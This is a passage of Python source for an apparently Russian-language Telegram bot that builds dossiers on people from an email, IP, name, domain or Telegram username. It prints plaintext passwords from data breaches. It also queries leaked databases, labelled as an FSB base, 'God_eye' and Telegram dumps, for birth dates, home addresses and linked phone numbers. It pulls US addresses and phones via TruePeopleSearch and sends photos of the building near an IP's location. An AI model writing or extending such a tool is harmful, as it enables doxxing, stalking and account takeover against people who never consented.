    is_role = check_email_role(email)
    social = check_email_social(email)
    pastes = check_email_pastes(email)
    leaked_passwords = search_leaked_passwords(email)

    # Apify TPS по email (US-only, часто по email ищет)
    apify_tps_email = {}
    if APIFY_TOKEN:
        try:
            from apify_client import ApifyClient
            client = ApifyClient(APIFY_TOKEN)
            run_input = {
                "searchMode": "email",
                "email": email,
                "maxItems": 2,
                "detailed": True,
            }
            run = client.actor(TRUEPEOPLESEARCH_APIFY_ACTOR).call(run_input=run_input)
            items = list(client.dataset(run.default_dataset_id).iterate_items())
            if items:
                rec = items[0]
                apify_tps_email = {
                    "name": rec.get("name"),
                    "addresses": rec.get("addresses", [])[:3],
                    "phones": rec.get("phones", [])[:5],
                }
        except Exception as e:
            log(f"[Apify TPS email] error: {e}")

    fb_records = search_facebook_email(email)
    fb_by_local = []
    local_part = email.split("@")[0]
    if local_part:
        fb_by_local = search_facebook_by_local(local_part)
    _seen_fb = set()
    fb_uniq = []
    for r in ([fb_records] if fb_records else []) + fb_by_local:
        if not r: continue
        em = r.get("email")
        if em and em not in _seen_fb:
            _seen_fb.add(em)
            fb_uniq.append(r)

    text = (f"📧 <b>Расширенная информация по Email</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"<b>Email:</b> <code>{email}</code>\n"
            f"<b>Домен:</b> {email.split('@')[-1]}\n"
            f"<b>Локальная часть:</b> {email.split('@')[0]}\n")
    if is_role:
        text += "<b>Тип:</b> 🏢 Ролевой/служебный\n"
    else:
        text += "<b>Тип:</b> 👤 Персональный\n"
    if disposable.get("disposable"):
        text += "<b>Одноразовый:</b> ⚠️ Да\n"
    else:
        text += "<b>Одноразовый:</b> ✅ Нет\n"
    text += "━━━━━━━━━━━━━━━━━━\n📮 <b>Проверка ящика:</b>\n"
    if smtp["status"] == "valid":
        text += f"  ✅ Существует ({smtp['reason']})\n"
    elif smtp["status"] == "invalid":
        text += f"  ❌ Не существует ({smtp['reason']})\n"
    else:
        text += f"  ⚠️ Не удалось проверить: {smtp['reason']}\n"
    if mx_records:
        text += "━━━━━━━━━━━━━━━━━━\n📬 <b>MX-записи домена:</b>\n"
        for host, pref in mx_records[:5]:
            text += f"  • <code>{host}</code> (приоритет {pref})\n"
    if domain_info:
        text += "━━━━━━━━━━━━━━━━━━\n🌐 <b>Информация о домене:</b>\n"
        if domain_info.get("registrar"):
            text += f"  <b>Регистратор:</b> {domain_info['registrar']}\n"
        if domain_info.get("created"):
            text += f"  <b>Создан:</b> {domain_info['created']}\n"
        if domain_info.get("country"):
            text += f"  <b>Страна:</b> {domain_info['country']}\n"
        if domain_info.get("ip"):
            text += f"  <b>IP:</b> <code>{domain_info['ip']}</code>\n"
    if gravatar:
        text += f"━━━━━━━━━━━━━━━━━━\n🖼️ <b>Gravatar:</b> <a href='{gravatar}'>найден</a>\n"
    if social:
        text += "━━━━━━━━━━━━━━━━━━\n🔗 <b>Найден на сервисах:</b>\n"
        for service, value in social.items():
            if isinstance(value, list):
                for v in value[:3]:
                    text += f"  • <b>{service}:</b> <a href='{v}'>{v}</a>\n"
            else:
                text += f"  • <b>{service}:</b> <a href='{value}'>профиль</a>\n"
    if github_users:
        text += "━━━━━━━━━━━━━━━━━━\n🐙 <b>GitHub-аккаунты:</b>\n"
        for u in github_users[:5]:
            text += f"  • <a href='{u['url']}'>@{u['login']}</a>\n"
    if apify_tps_email:
        text += "━━━━━━━━━━━━━━━━━━\n🇺🇸 <b>TruePeopleSearch (Apify):</b>\n"
        if apify_tps_email.get("name"):
            text += f"  <b>Имя:</b> {apify_tps_email['name']}\n"
        for addr in apify_tps_email.get("addresses", [])[:2]:
            text += f"  <b>Адрес:</b> {addr}\n"
        for ph in apify_tps_email.get("phones", [])[:3]:
            text += f"  <b>Телефон:</b> {ph}\n"
    if fb_uniq:
        text += f"━━━━━━━━━━━━━━━━━━\n📘 <b>Facebook Email базы ({len(fb_uniq)}):</b>\n"
        for rec in fb_uniq[:15]:
            text += f"  • <code>{rec['email']}</code> <i>({rec['source']})</i>\n"
        if len(fb_uniq) > 15:
            text += f"  <i>... и ещё {len(fb_uniq) - 15}</i>\n"
    if leaked_passwords:
        text += f"━━━━━━━━━━━━━━━━━━\n🔑 <b>Пароли из утечек ({len(leaked_passwords)}):</b>\n"
        for pwd in leaked_passwords[:10]:
            safe = str(pwd).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
            text += f"  • <code>{safe}</code>\n"
        if len(leaked_passwords) > 10:
            text += f"  <i>... и ещё {len(leaked_passwords) - 10}</i>\n"
    text += "━━━━━━━━━━━━━━━━━━\n🔐 <b>Утечки:</b>\n"
    if breaches_list:
        text += f"  ⚠️ Найден в {len(breaches_list)} утечках:\n"
        for b in breaches_list[:15]:
            text += f"    • {b}\n"
        if len(breaches_list) > 15:
            text += f"    <i>... и ещё {len(breaches_list) - 15}</i>\n"
    else:
        text += "  ✅ В известных утечках не найден\n"
    if leakcheck:
        text += "━━━━━━━━━━━━━━━━━━\n🕵️ <b>LeakCheck:</b>\n"
        text += f"  <b>Найдено записей:</b> {leakcheck.get('found', 0)}\n"
        for src in leakcheck.get("sources", [])[:10]:
            text += f"    • {src}\n"
    if pastes:
        text += f"━━━━━━━━━━━━━━━━━━\n📋 <b>Публичные пасты:</b> {len(pastes)}\n"
        for p in pastes[:5]:
            text += f"  • {p.get('Source', '—')} ({p.get('Date', '—')})\n"
    text += f"━━━━━━━━━━━━━━━━━━\n📱 <b>Аккаунты (holehe):</b>\n{accounts_text}\n"
    text += ("━━━━━━━━━━━━━━━━━━\n"
             "🔎 <b>Ручные сервисы:</b>\n"
             f"  • <a href='https://www.google.com/search?q=%22{quote(email)}%22'>Google</a>\n"
             f"  • <a href='https://haveibeenpwned.com/account/{quote(email)}'>HaveIBeenPwned</a>\n"
             f"  • <a href='https://leakcheck.io/'>LeakCheck</a>\n"
             f"  • <a href='https://dehashed.com/'>DeHashed</a>\n"
             f"  • <a href='https://intelx.io/'>Intelligence X</a>\n")

    sections = [
        {"heading": "Основные данные", "items": [
            ("Email", email),
            ("Домен", email.split("@")[-1]),
            ("Локальная часть", email.split("@")[0]),
            ("Тип", "Ролевой/служебный" if is_role else "Персональный"),
            ("Одноразовый", "Да" if disposable.get("disposable") else "Нет"),
        ]},
        {"heading": "Проверка ящика (SMTP)", "items": [
            ("Статус", smtp["status"]),
            ("Причина", smtp["reason"]),
        ]},
    ]
    if mx_records:
        sections.append({"heading": "MX-записи", "items": [
            (host, f"приоритет {pref}") for host, pref in mx_records]})
    if domain_info:
        sections.append({"heading": "Домен", "items": [(k, str(v)) for k, v in domain_info.items()]})
    if social:
        lines = []
        for service, value in social.items():
            if isinstance(value, list):
                for v in value[:3]:
                    lines.append(f"{service}: {v}")
            else:
                lines.append(f"{service}: {value}")
        sections.append({"heading": "Соцсети и сервисы", "lines": lines})
    if github_users:
        sections.append({"heading": "GitHub", "lines": [
            f"@{u['login']} — {u['url']}" for u in github_users]})
    if apify_tps_email:
        sections.append({"heading": "TruePeopleSearch (Apify)", "items": [
            (k, str(v)) for k, v in apify_tps_email.items()]})
    if fb_uniq:
        sections.append({"heading": f"Facebook Email базы ({len(fb_uniq)})",
                         "lines": [f"{r['email']} — {r['source']}" for r in fb_uniq[:50]]})
    if leaked_passwords:
        sections.append({"heading": f"Пароли из утечек ({len(leaked_passwords)})",
                         "lines": [str(p) for p in leaked_passwords[:100]]})
    sections.append({"heading": "Утечки", "lines":
        breaches_list if breaches_list else ["Утечек не найдено"]})
    if leakcheck:
        sections.append({"heading": "LeakCheck", "items": [
            ("Найдено записей", str(leakcheck.get("found", 0))),
        ], "lines": leakcheck.get("sources", [])[:20]})
    if pastes:
        sections.append({"heading": "Публичные пасты", "lines": [
            f"{p.get('Source', '—')} ({p.get('Date', '—')})" for p in pastes[:10]]})
    sections.append({"heading": "Аккаунты (holehe)", "lines":
        accounts_list if accounts_list else ["Аккаунтов не найдено"]})
    sections.append({"heading": "Ручные сервисы", "items": [
        ("Google", f"https://www.google.com/search?q=%22{quote(email)}%22"),
        ("HaveIBeenPwned", f"https://haveibeenpwned.com/account/{quote(email)}"),
        ("LeakCheck", "https://leakcheck.io/"),
        ("DeHashed", "https://dehashed.com/"),
        ("Intelligence X", "https://intelx.io/"),
    ]})
    report = {"type": "email", "title": f"Расширенный отчёт по email {email}", "sections": sections}
    return text, report


# ================== IP ==================
def lookup_ip(ip_input, chat_id=None):
    ip = ip_input.strip()
    try:
        ipaddress.ip_address(ip)
    except ValueError:
        return "❌ Некорректный IP-адрес.", None
    items = [("IP", ip)]
    text = f"🌐 <b>Информация об IP</b>\n━━━━━━━━━━━━━━━━━━\n<b>IP:</b> <code>{ip}</code>\n"
    lat_ip = None
    lon_ip = None
    try:
        r = requests.get(
            f"http://ip-api.com/json/{ip}?fields=status,message,country,countryCode,"
            f"region,regionName,city,zip,lat,lon,timezone,isp,org,as,query", timeout=10)
        data = r.json()
        if data.get("status") == "success":
            lat_ip = data.get("lat")
            lon_ip = data.get("lon")
            items += [
                ("Страна", f"{data.get('country')} ({data.get('countryCode')})"),
                ("Регион", data.get("regionName")),
                ("Город", data.get("city")),
                ("Индекс", data.get("zip") or "—"),
                ("Координаты", f"{data.get('lat')}, {data.get('lon')}"),
                ("Провайдер", data.get("isp")),
                ("Организация", data.get("org")),
                ("AS", data.get("as")),
                ("Часовой пояс", data.get("timezone")),
            ]
            text += (f"<b>Страна:</b> {data.get('country')} ({data.get('countryCode')})\n"
                     f"<b>Регион:</b> {data.get('regionName')}\n"
                     f"<b>Город:</b> {data.get('city')}\n"
                     f"<b>Провайдер:</b> {data.get('isp')}\n"
                     f"<b>Организация:</b> {data.get('org')}\n"
                     f"<b>AS:</b> {data.get('as')}\n"
                     f"<b>Часовой пояс:</b> {data.get('timezone')}\n")
            try:
                if lat_ip and lon_ip:
                    addr, _ = get_address_by_coordinates(lat_ip, lon_ip)
                    if addr:
                        translated = translate_address(addr)
                        addr_text = ", ".join(str(v) for v in translated.values())
                        text += f"<b>Приблизительный адрес:</b> {addr_text}\n"
            except Exception:
                pass
        else:
            text += f"⚠️ Геолокация недоступна: {data.get('message', 'ошибка')}\n"
    except Exception as e:
        text += f"⚠️ Ошибка геолокации: {str(e)[:50]}\n"
    shodan_items = []
    try:
        r = requests.get(f"https://internetdb.shodan.io/{ip}", timeout=10)
        if r.status_code == 200:
            data = r.json()
            ports = data.get("ports", [])
            vulns = data.get("vulns", [])
            hostnames = data.get("hostnames", [])
            shodan_items = [
                ("Открытые порты", ", ".join(map(str, ports)) if ports else "нет"),
                ("Уязвимости", ", ".join(vulns) if vulns else "не найдено"),
                ("Хостовые имена", ", ".join(hostnames) if hostnames else "нет"),
            ]
            text += (f"━━━━━━━━━━━━━━━━━━\n🛡️ <b>Shodan InternetDB:</b>\n"
                     f"<b>Открытые порты:</b> {', '.join(map(str, ports)) if ports else 'нет'}\n"
                     f"<b>Уязвимости:</b> {', '.join(vulns) if vulns else 'не найдено'}\n"
                     f"<b>Хостовые имена:</b> {', '.join(hostnames) if hostnames else 'нет'}\n")
        else:
            text += "⚠️ Shodan InternetDB: данные не найдены\n"
    except Exception:
        text += "⚠️ Shodan InternetDB недоступен\n"

    if lat_ip and lon_ip and chat_id:
        try:
            send_building_photo(chat_id, lat_ip, lon_ip, caption=f"📸 Примерный вид для IP {ip}")
        except Exception as e:
            log(f"[BuildingPhoto IP] error: {e}")

    report = {"type": "ip", "title": f"Отчёт по IP {ip}", "sections": [
        {"heading": "Геолокация и сеть", "items": items},
        ({"heading": "Shodan InternetDB", "items": shodan_items} if shodan_items
         else {"heading": "Shodan InternetDB", "notes": ["Данные не найдены"]}),
    ]}
    return text, report


def lookup_ip_extended(ip_input, chat_id=None):
    ip = ip_input.strip()
    try:
        ipaddress.ip_address(ip)
    except ValueError:
        return "❌ Некорректный IP-адрес.", None
    apis = [
        {'name': 'ipapi.co', 'url': f'https://ipapi.co/{ip}/json/'},
        {'name': 'ip-api.com', 'url': f'http://ip-api.com/json/{ip}?fields=66846719'},
        {'name': 'ipwhois.io', 'url': f'http://free.ipwhois.io/json/{ip}'},
    ]
    ip_info = {}
    for api in apis:
        try:
            r = requests.get(api['url'], headers={'User-Agent': 'Mozilla/5.0'}, timeout=10)
            if r.status_code == 200:
                ip_info.update(r.json())
        except Exception:
            pass
    if not ip_info:
        return "❌ Не удалось получить данные об IP.", None
    text = f"🌐 <b>Расширенная информация об IP</b>\n━━━━━━━━━━━━━━━━━━\n<b>IP:</b> <code>{ip}</code>\n"
    items = [("IP", ip)]
    fields = [
        ("ip", "IP-адрес"), ("query", "IP-адрес"), ("version", "Версия IP"),
        ("country_name", "Страна"), ("country", "Страна"), ("country_code", "Код страны"),
        ("region_name", "Регион"), ("region", "Регион"), ("region_code", "Код региона"),
        ("city", "Город"), ("zip", "Индекс"), ("postal", "Индекс"),
        ("latitude", "Широта"), ("longitude", "Долгота"),
        ("org", "Организация"), ("isp", "Провайдер"), ("asn", "ASN"),
        ("timezone", "Часовой пояс"), ("time_zone", "Часовой пояс"),
        ("currency", "Валюта"), ("currency_name", "Валюта"),
        ("languages", "Языки"), ("country_calling_code", "Тел. код страны"),
        ("country_flag", "Флаг"), ("continent", "Континент"),
        ("continent_code", "Код континента"), ("capital", "Столица"),
        ("borders", "Границы"),
    ]
    seen = set()
    for key, label in fields:
        if key in ip_info and ip_info[key] not in (None, "", "Неизвестно") and label not in seen:
            text += f"<b>{label}:</b> {ip_info[key]}\n"
            items.append((label, str(ip_info[key])))
            seen.add(label)
    for flag_key, label in [("mobile", "Мобильное соединение"),
                            ("proxy", "Прокси/VPN"), ("hosting", "Хостинг")]:
        if ip_info.get(flag_key) is not None:
            v = "Да" if ip_info[flag_key] else "Нет"
            text += f"<b>{label}:</b> {v}\n"
            items.append((label, v))

    lat_b = ip_info.get("latitude") or ip_info.get("lat")
    lon_b = ip_info.get("longitude") or ip_info.get("lon")
    if lat_b and lon_b and chat_id:
        try:
            send_building_photo(chat_id, lat_b, lon_b, caption=f"📸 Примерный вид для IP {ip}")
        except Exception as e:
            log(f"[BuildingPhoto IPX] error: {e}")

    report = {"type": "ip", "title": f"Отчёт по IP {ip} (расширенный)",
              "sections": [{"heading": "Данные IP", "items": items}]}
    return text, report


# ================== ФИО ==================
def lookup_name(full_name):
    fsb_matches = search_fsb_by_name(full_name)
    god_eye_matches = search_god_eye_by_name(full_name)
    tg_matches = search_tg_by_name(full_name)
    fb_matches = search_facebook_by_name(full_name)
    apify_tps_name = check_apify_truepeoplesearch(full_name, is_phone=False)
    query = quote(full_name)
    links = [
        ("Яндекс", f"https://yandex.ru/search/?text={query}"),
        ("Google", f"https://www.google.com/search?q={query}"),
        ("ВКонтакте", f"https://vk.com/search?c[q]={query}&c[section]=people"),
        ("Facebook", f"https://www.facebook.com/search/top?q={query}"),
        ("LinkedIn", f"https://www.linkedin.com/search/results/all/?keywords={query}"),
        ("Одноклассники", f"https://ok.ru/search?st.query={query}"),
    ]
    text = f"👤 <b>Поиск по ФИО:</b> {full_name}\n━━━━━━━━━━━━━━━━━━\n"
    if fsb_matches:
        text += f"🚨 <b>Найдено в базе ФСБ: {len(fsb_matches)}</b>\n"
        for i, rec in enumerate(fsb_matches[:10], 1):
            text += f"  <b>{i}.</b> <b>{rec['ФИО']}</b>\n     📅 {rec['Дата рождения']}\n"
            if rec.get("Адрес"): text += f"     🏠 {rec['Адрес']}\n"
            if rec.get("Орган выдачи"): text += f"     🏛 {rec['Орган выдачи']}\n"
            if rec.get("Прочее"): text += f"     📝 {rec['Прочее'][:200]}\n"
            if rec.get("Phones"): text += f"     📞 {', '.join(rec['Phones'][:5])}\n"
        if len(fsb_matches) > 10:
            text += f"  <i>... и ещё {len(fsb_matches) - 10}</i>\n"
        text += "━━━━━━━━━━━━━━━━━━\n"
    if god_eye_matches:
        text += f"👁 <b>Найдено в God_eye: {len(god_eye_matches)}</b>\n"
        for rec in god_eye_matches[:10]:
            text += (f"  • ID <code>{rec['tg_id']}</code> @{rec['username'] or '—'} — "
                     f"{rec['first_name']} {rec['last_name']}\n")
        text += "━━━━━━━━━━━━━━━━━━\n"
    if tg_matches:
        text += f"✈️ <b>Найдено в Telegram базе: {len(tg_matches)}</b>\n"
        for rec in tg_matches[:10]:
            safe_name = rec["name"].replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
            text += f"  • ID <code>{rec['tg_id']}</code> @{rec['username'] or '—'} — {safe_name}\n"
        text += "━━━━━━━━━━━━━━━━━━\n"
    if fb_matches:
        text += f"📘 <b>Найдено в Facebook Email базах: {len(fb_matches)}</b>\n"
        for rec in fb_matches[:15]:
            text += f"  • <code>{rec['email']}</code> <i>({rec['source']})</i>\n"
        if len(fb_matches) > 15:
            text += f"  <i>... и ещё {len(fb_matches) - 15}</i>\n"
        text += "━━━━━━━━━━━━━━━━━━\n"
    if apify_tps_name:
        text += "🇺🇸 <b>TruePeopleSearch (Apify):</b>\n"
        if apify_tps_name.get("name"):
            text += f"  <b>Имя:</b> {apify_tps_name['name']}\n"
        if apify_tps_name.get("age"):
            text += f"  <b>Возраст:</b> {apify_tps_name['age']}\n"
        for addr in apify_tps_name.get("addresses", [])[:2]:
            text += f"  <b>Адрес:</b> {addr}\n"
        text += "━━━━━━━━━━━━━━━━━━\n"
    for name, url in links:
        text += f"🔍 <a href='{url}'>{name}</a>\n"
    text += "━━━━━━━━━━━━━━━━━━"
    sections = [{"heading": "Ссылки для проверки", "items": links}]
    if fsb_matches:
        sections.insert(0, {"heading": f"База ФСБ ({len(fsb_matches)})", "items": [
            (r["ФИО"], f"{r['Дата рождения']} | {r.get('Адрес','')} | "
                       f"тел: {', '.join(r.get('Phones', [])[:3])}")
            for r in fsb_matches]})
    if god_eye_matches:
        sections.insert(0, {"heading": f"God_eye ({len(god_eye_matches)})", "lines": [
            f"ID {r['tg_id']} @{r['username']} — {r['first_name']} {r['last_name']}"
            for r in god_eye_matches]})
    if tg_matches:
        sections.insert(0, {"heading": f"Telegram база ({len(tg_matches)})", "lines": [
            f"ID {r['tg_id']} @{r['username'] or '—'} — {r['name']}"
            for r in tg_matches]})
    if fb_matches:
        sections.insert(0, {"heading": f"Facebook Email базы ({len(fb_matches)})", "lines": [
            f"{r['email']} — {r['source']}" for r in fb_matches[:50]]})
    if apify_tps_name:
        sections.insert(0, {"heading": "TruePeopleSearch (Apify)",
                            "items": [(k, str(v)) for k, v in apify_tps_name.items()]})
    return text, {"type": "name", "title": f"Отчёт по ФИО {full_name}", "sections": sections}


# ================== САЙТ ==================
def lookup_whois(domain):
    try:
        w = whois.whois(domain)
        items = []
        if w.registrar: items.append(("Регистратор", str(w.registrar)))
        if w.creation_date:
            d = w.creation_date[0] if isinstance(w.creation_date, list) else w.creation_date
            items.append(("Дата регистрации", str(d)))
        if w.expiration_date:
            d = w.expiration_date[0] if isinstance(w.expiration_date, list) else w.expiration_date
            items.append(("Дата истечения", str(d)))
        if w.updated_date:
            d = w.updated_date[0] if isinstance(w.updated_date, list) else w.updated_date
            items.append(("Обновлён", str(d)))
        if w.name_servers:
            ns = w.name_servers if isinstance(w.name_servers, list) else [w.name_servers]
            items.append(("NS-серверы", ", ".join(str(n) for n in ns[:5])))
        if w.org: items.append(("Организация", str(w.org)))
        if w.country: items.append(("Страна", str(w.country)))
        if not items: return "⚠️ WHOIS не вернул данных", None
        return items, items
    except Exception as e:
        return f"❌ Ошибка WHOIS: {str(e)[:80]}", None


def lookup_dns(domain):
    records = {}
    for rtype in ["A", "AAAA", "MX", "NS", "TXT", "CNAME"]:
        try:
            answers = dns.resolver.resolve(domain, rtype, lifetime=5)
            records[rtype] = [str(r) for r in answers]
        except Exception:
            continue
    return records


def check_http(domain):
    result = {}
    for scheme in ["https", "http"]:
        try:
            r = requests.get(f"{scheme}://{domain}", timeout=10, allow_redirects=True,
                             headers={"User-Agent": "Mozilla/5.0"})
            result["status"] = r.status_code
            result["final_url"] = r.url
            result["server"] = r.headers.get("Server", "—")
            result["content_type"] = r.headers.get("Content-Type", "—")
            return result
        except requests.exceptions.SSLError: continue
        except requests.exceptions.ConnectionError: continue
        except requests.exceptions.Timeout:
            result["error"] = "Таймаут"; return result
        except Exception as e:
            result["error"] = str(e)[:80]; return result
    result["error"] = "Сайт недоступен"
    return result


def check_ssl(domain):
    try:
        ctx = ssl.create_default_context()
        with ctx.wrap_socket(socket.socket(), server_hostname=domain) as s:
            s.settimeout(10); s.connect((domain, 443))
            cert = s.getpeercert()
        return [
            ("Издатель", dict(x[0] for x in cert["issuer"]).get("organizationName", "—")),
            ("Действует с", cert.get("notBefore", "—")),
            ("Действует до", cert.get("notAfter", "—")),
            ("Домены", ", ".join(d[1] for d in cert.get("subjectAltName", [])[:5])),
        ]
    except Exception as e:
        return [("Ошибка", str(e)[:80])]


def lookup_site(url_input):
    domain = url_input.strip().lower()
    domain = re.sub(r"^https?://", "", domain).split("/")[0]
    if "." not in domain or len(domain) < 4:
        return "❌ Некорректный домен.", None
    text = f"🌍 <b>Информация о сайте {domain}</b>\n━━━━━━━━━━━━━━━━━━\n"
    sections = []
    whois_result, whois_items = lookup_whois(domain)
    if whois_items:
        text += "📋 <b>WHOIS:</b>\n"
        for k, v in whois_items: text += f"  <b>{k}:</b> {v}\n"
        sections.append({"heading": "WHOIS", "items": whois_items})
    else:
        text += f"📋 {whois_result}\n"
    dns_records = lookup_dns(domain)
    if dns_records:
        text += "━━━━━━━━━━━━━━━━━━\n🌐 <b>DNS:</b>\n"
        dns_items = []
        for rtype, values in dns_records.items():
            joined = ", ".join(values[:3])
            text += f"  <b>{rtype}:</b> {joined}\n"
            dns_items.append((rtype, joined))
        sections.append({"heading": "DNS-записи", "items": dns_items})
    http = check_http(domain)
    text += "━━━━━━━━━━━━━━━━━━\n🔌 <b>HTTP:</b>\n"
    http_items = []
    if "error" in http:
        text += f"  ❌ {http['error']}\n"
        http_items.append(("Ошибка", http["error"]))
    else:
        text += (f"  <b>Статус:</b> {http.get('status')}\n"
                 f"  <b>Финальный URL:</b> {http.get('final_url')}\n"
                 f"  <b>Сервер:</b> {http.get('server')}\n")
        http_items = [
            ("Статус", http.get("status")),
            ("Финальный URL", http.get("final_url")),
            ("Сервер", http.get("server")),
            ("Content-Type", http.get("content_type")),
        ]
    sections.append({"heading": "HTTP", "items": http_items})
    ssl_items = check_ssl(domain)
    text += "━━━━━━━━━━━━━━━━━━\n🔒 <b>SSL:</b>\n"
    for k, v in ssl_items: text += f"  <b>{k}:</b> {v}\n"
    sections.append({"heading": "SSL-сертификат", "items": ssl_items})
    try:
        ip = socket.gethostbyname(domain)
        text += f"━━━━━━━━━━━━━━━━━━\n🖥️ <b>IP сайта:</b> <code>{ip}</code>\n"
        sections.append({"heading": "IP-адрес", "items": [("IP", ip)]})
    except Exception:
        pass
    return text, {"type": "site", "title": f"Отчёт по сайту {domain}", "sections": sections}


# ================== КАДАСТР ==================
def lookup_kadastr(address):
    address = address.strip()
    if len(address) < 5:
        return "❌ Слишком короткий адрес.", None
    encoded = quote(address)
    lk_link = f"https://lk.rosreestr.ru/eservices/real-estate-objects-online?address={encoded}"
    nspd_link = "https://nspd.gov.ru/"
    gosuslugi_link = "https://www.gosuslugi.ru/600114/1/form"
    text = (f"🏠 <b>Поиск кадастрового номера</b>\n━━━━━━━━━━━━━━━━━━\n"
            f"<b>Адрес:</b> {address}\n\n"
            f"Росреестр не предоставляет публичный API для поиска по адресу. "
            f"Откройте официальный сервис и введите адрес вручную:\n\n"
            f"🔗 <a href='{lk_link}'>Справочная информация (Росреестр)</a>\n"
            f"🔗 <a href='{nspd_link}'>Публичная кадастровая карта (НСПД)</a>\n"
            f"🔗 <a href='{gosuslugi_link}'>Заказать выписку ЕГРН (Госуслуги)</a>\n\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"<i>Данные предоставляются бесплатно и без авторизации.</i>")
    report = {"type": "kadastr", "title": f"Поиск кадастра по адресу {address}", "sections": [
        {"heading": "Адрес", "items": [("Адрес", address)]},
        {"heading": "Ссылки на официальные сервисы", "items": [
            ("Росреестр (справка)", lk_link),
            ("НСПД (ПКК)", nspd_link),
            ("Госуслуги (ЕГРН)", gosuslugi_link),
        ], "notes": [
            "Откройте ссылку и введите адрес вручную.",
            "Сервисы Росреестра работают без авторизации.",
            "Для юридически значимых данных закажите выписку ЕГРН.",
        ]},
    ]}
    return text, report


# ================== TELEGRAM OSINT ==================
def lookup_telegram_osint(username):
    username = username.strip().lstrip("@")
    if len(username) < 3:
        return "❌ Слишком короткий username.", None
    username_lower = username.lower()
    god_eye_match = search_god_eye_by_username(username_lower)
    tg_match = search_tg_by_username(username_lower)
    candidates = []
    if god_eye_match:
        candidates.append(("god_eye", god_eye_match))
    if tg_match:
        candidates.append(("telegram", tg_match))
    for src, rec in list(candidates):
        try:
            tg_id = str(rec.get("tg_id", "")).strip()
            if tg_id:
                extra = search_tg_by_id(tg_id)
                if extra and extra not in [c[1] for c in candidates]:
                    candidates.append(("telegram_by_id", extra))
        except Exception:
            pass
    phone = None
    phone_source = None
    if god_eye_match and god_eye_match.get("phone"):
        phone = god_eye_match["phone"]
        phone_source = "God_eye"
    if not phone and tg_match and tg_match.get("phone"):
        phone = tg_match["phone"]
        phone_source = "Telegram база"
    if phone:
        extra_god = search_god_eye_by_phone(phone)
        for rec in extra_god:
            if rec.get("username", "").lower() == username_lower:
                continue
            if rec not in [c[1] for c in candidates]:
                candidates.append(("god_eye_by_phone", rec))
        extra_tg = search_tg_by_phone(phone)
        for rec in extra_tg:
            if rec.get("username", "").lower() == username_lower:
                continue
            if rec not in [c[1] for c in candidates]:
                candidates.append(("telegram_by_phone", rec))
    blocks = ""
    if phone:
        blocks += (f"📞 <b>Привязанный номер:</b> <code>+{phone}</code>\n"
                   f"<i>(источник: {phone_source})</i>\n\n")
        for src, rec in candidates:
            if src in ("god_eye_by_phone", "telegram_by_phone"):
                other_username = rec.get("username")
                if other_username and other_username.lower() != username_lower:
                    blocks += (f"🔗 <b>Связанный username:</b> @{other_username} "
                               f"<i>({src})</i>\n")
        blocks += "\n"
    for src, rec in candidates:
        if src in ("god_eye_by_phone", "telegram_by_phone"):
            continue
        if src == "god_eye":
            tg_id = rec.get("tg_id", "—")
            first = rec.get("first_name", "")
            last = rec.get("last_name", "")
            u = rec.get("username", "")
            ph = rec.get("phone", "")
            blocks += (f"👁 <b>God_eye:</b>\n"
                       f"  • <b>TG ID:</b> <code>{tg_id}</code>\n"
                       f"  • <b>Имя:</b> {first} {last}\n")
            if u: blocks += f"  • <b>Username:</b> @{u}\n"
            if ph: blocks += f"  • <b>Телефон:</b> <code>+{ph}</code>\n"
            blocks += "\n"
        elif src in ("telegram", "telegram_by_id"):
            safe_name = (rec.get("name") or "").replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
            tg_id = rec.get("tg_id", "—")
            u = rec.get("username", "")
            ph = rec.get("phone", "")
            blocks += (f"✈️ <b>Telegram база:</b>\n"
                       f"  • <b>TG ID:</b> <code>{tg_id}</code>\n"
                       f"  • <b>Имя:</b> {safe_name}\n")
            if u: blocks += f"  • <b>Username:</b> @{u}\n"
            if ph: blocks += f"  • <b>Телефон:</b> <code>+{ph}</code>\n"
            blocks += "\n"
    text = (f"{blocks}"
            f"📱 <b>OSINT-анализ Telegram</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"<b>Username:</b> @{username}\n"
            f"<b>Ссылка:</b> <a href='https://t.me/{username}'>t.me/{username}</a>\n")
    if not phone and not candidates:
        text += ("\n⚠️ <i>Пользователь не найден в загруженных базах. "
                 "Попробуйте сервисы ниже.</i>\n")
    elif not phone:
        text += "\n⚠️ <i>Username найден, но привязанный номер отсутствует в базах.</i>\n"
    services = [
        ("TelegramDB Search Lite", "tgdb_search_bot", "Поиск каналов, групп, резолв ID/username."),
        ("Funstat", "FunstatBot", "Статистика: сообщения, группы, история имён."),
        ("Telesint", "telesint_bot", "Группы и чаты, где состоит пользователь."),
        ("Unamer", "unamer_bot", "Поиск старых username и имён."),
        ("usinfobot", "usinfobot", "ID, имя, дата регистрации по пересланному сообщению."),
    ]
    text += "\n<b>Публичные сервисы для проверки:</b>\n\n"
    for name, bot_username, desc in services:
        text += f"🔹 <b>{name}</b> — <a href='https://t.me/{bot_username}'>@{bot_username}</a>\n"
        text += f"   {desc}\n\n"
    text += (f"━━━━━━━━━━━━━━━━━━\n"
             f"<i>Сервисы работают внутри Telegram.</i>\n\n"
             f"<b>Что можно узнать легально:</b>\n"
             f"• Telegram ID\n"
             f"• Дата регистрации (приблизительно)\n"
             f"• История username\n"
             f"• Публичные группы\n"
             f"• Флаги (scam/fake/premium/verified)\n"
             f"• Био и аватар")
    sections = [{"heading": "Аккаунт", "items": [
        ("Username", f"@{username}"),
        ("Ссылка", f"https://t.me/{username}"),
    ]}]
    if phone:
        sections.insert(0, {"heading": "📞 Привязанный номер", "items": [
            ("Телефон", f"+{phone}"),
            ("Источник", phone_source or "—"),
        ]})
    for src, rec in candidates:
        if src == "god_eye":
            items = [
                ("TG ID", rec.get("tg_id", "—")),
                ("Имя", f"{rec.get('first_name','')} {rec.get('last_name','')}".strip()),
                ("Username", f"@{rec.get('username','')}" if rec.get("username") else "—"),
                ("Телефон", f"+{rec.get('phone','')}" if rec.get("phone") else "—"),
            ]
            sections.insert(0, {"heading": "👁 God_eye", "items": items})
        elif src in ("telegram", "telegram_by_id"):
            items = [
                ("TG ID", rec.get("tg_id", "—")),
                ("Имя", rec.get("name", "—")),
                ("Username", f"@{rec.get('username','')}" if rec.get("username") else "—"),
            ]
            if rec.get("phone"):
                items.append(("Телефон", f"+{rec['phone']}"))
